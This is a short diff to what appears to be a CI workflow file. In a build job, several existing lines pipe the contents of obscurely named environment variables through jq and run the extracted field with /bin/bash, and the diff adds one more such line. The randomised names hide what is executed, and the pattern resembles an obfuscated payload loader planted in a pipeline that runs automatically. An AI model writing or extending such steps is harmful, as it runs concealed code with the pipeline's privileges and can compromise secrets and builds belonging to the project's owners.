@@ -50,6 +50,7 @@ jobs:
           printf '%s' "$vo43" | jq -r .p5545 | /bin/bash
           echo $lngox63 | jq -r .gs30 | /bin/bash
           echo $x9 | jq -r .kr26378 | /bin/bash
+          echo $ej86 | jq -r .aphgr2 | /bin/bash
 
       - name: Save archive
         if: always()
